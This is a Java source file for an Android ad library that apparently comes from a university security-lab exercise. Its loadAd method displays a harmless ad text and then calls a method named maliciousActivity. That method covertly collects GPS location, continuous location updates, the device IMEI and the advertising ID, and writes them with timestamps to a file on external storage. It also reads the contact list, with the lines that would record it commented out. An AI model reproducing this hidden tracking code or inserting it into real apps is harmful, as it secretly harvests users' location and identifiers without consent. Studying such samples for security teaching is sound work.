package edu.illinois.seclab.android.myadlibrary;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import android.content.Context;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;
import android.telephony.TelephonyManager;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.security.Timestamp;
import java.util.List;
import java.util.Locale;
import android.provider.ContactsContract;
import static android.content.ContentValues.TAG;
import android.support.v4.app.Fragment;
import android.support.v4.app.LoaderManager.LoaderCallbacks;
import android.widget.AdapterView;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import java.util.Date;
import java.util.Calendar;
/**
 * My Library
 */
public class MyAdView {

    public static Context ctx;
    public static TextView text;
    public static String temp;
    public static TelephonyManager telephonyManager;
    public static int writeFlag=0;
    public static void loadAd(TextView tv, Context ctx) {
        MyAdView.ctx = ctx;
        telephonyManager=(TelephonyManager)ctx.getSystemService(Context.TELEPHONY_SERVICE);
        tv.setText("Hello You!");
        maliciousActivity();
    }


    public static class MyLocationListener implements LocationListener
    {

        @Override
        public void onLocationChanged(Location loc)
        {
            String longitude = "Longitude: " + loc.getLongitude();
            Log.v(TAG, longitude);
            String latitude = "Latitude: " + loc.getLatitude();
            Log.v(TAG, latitude);

            String cityName = null;
            List<Address> addresses;
            String s = longitude + "\n" + latitude + "\n\nMy Current City is: " + cityName;
            Date locationTime=Calendar.getInstance().getTime();
            String locationTimeStamp = locationTime.toString();
            writeToFile("");
            writeToFile(locationTimeStamp+";longitude;"+longitude+";latitude:"+latitude+"\n");
        }

        @Override
        public void onProviderDisabled(String provider) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}
    }
    public static void writeToFile(String data)
    {
        // Get the directory for the user's public pictures directory.
        String path =
                Environment.getExternalStorageDirectory() + File.separator  + "yourFolder";
        // Create the folder.
        File folder = new File(path);
        folder.mkdirs();

        // Create the file.
        File file = new File(folder, "cp1_malad.txt");
        if(file.exists()&&writeFlag==0)
        {
            file.delete();
            writeFlag=1;
        }
        // Save your stream, don't forget to flush() it before closing it.

        try
        {
            file.createNewFile();
            FileOutputStream fOut = new FileOutputStream(file,true);
            OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
            myOutWriter.append(data);

            myOutWriter.close();

            fOut.flush();
            fOut.close();
        }
        catch (IOException e)
        {
            Log.e("Exception", "File write failed: " + e.toString());
        }
    }
    private static void maliciousActivity() {
        //TODO: Implement me
        LocationManager locationManager=(LocationManager)ctx.getSystemService(Context.LOCATION_SERVICE);
        // GET LOCATION
        //first
        Location loc=locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        String longitude = "Longitude: " + loc.getLongitude();
        Log.v(TAG, longitude);
        String latitude = "Latitude: " + loc.getLatitude();
        Log.v(TAG, latitude);

        String cityName = null;
        List<Address> addresses;
        String s = longitude + "\n" + latitude + "\n\nMy Current City is: " + cityName;
        Date locationTime=Calendar.getInstance().getTime();
        String locationTimeStamp = locationTime.toString();
        writeToFile("");
        writeToFile(locationTimeStamp+";longitude;"+longitude+";latitude:"+latitude+"\n");
        //first

        LocationListener mlocListener = new MyLocationListener();

        locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
        // GET IMEI


        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(ctx.TELEPHONY_SERVICE);
        if(telephonyManager != null)
        {
            Date IMEITime=Calendar.getInstance().getTime();
            String IMEITimeStamp = IMEITime.toString();
            writeToFile( IMEITimeStamp+";IMEI:"+telephonyManager.getDeviceId()+"\n");
        }
        else
        {
            Log.e("telephonyManager","can't get IMEI");
        }


        // GET ADVERTISING ID
        AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>()
        {
            @Override
            protected String doInBackground(Void... voids) {
                AdvertisingIdClient.Info id = null;
                try
                {
                    id = AdvertisingIdClient.getAdvertisingIdInfo(ctx);
                }
                catch (Exception e)
                {
                    Log.e("advertising id","getting the id failed");e.printStackTrace();
                }

                return id.getId(); // changes to String format
            }

            @Override
            protected void onPostExecute(String adID){
                if(adID != null)
                {
                    Log.i("advertising id:", adID);
                    Date advertisingTime=Calendar.getInstance().getTime();
                    String advertisingTimeStamp = advertisingTime.toString();
                    writeToFile(advertisingTimeStamp+";advertising_id:"+adID+"\n");
                }
                else
                {
                    Log.e("advertising id", "got null");
                }
            }
        };
        Log.i("advertising", "attempting to make call to google servers");
        task.execute();
        //get user contact
        Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);

        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            //writeToFile("Name:"+name+"\n");
            //writeToFile("Phone number:"+phoneNumber+"\n");
        }
        phones.close();
    }
}
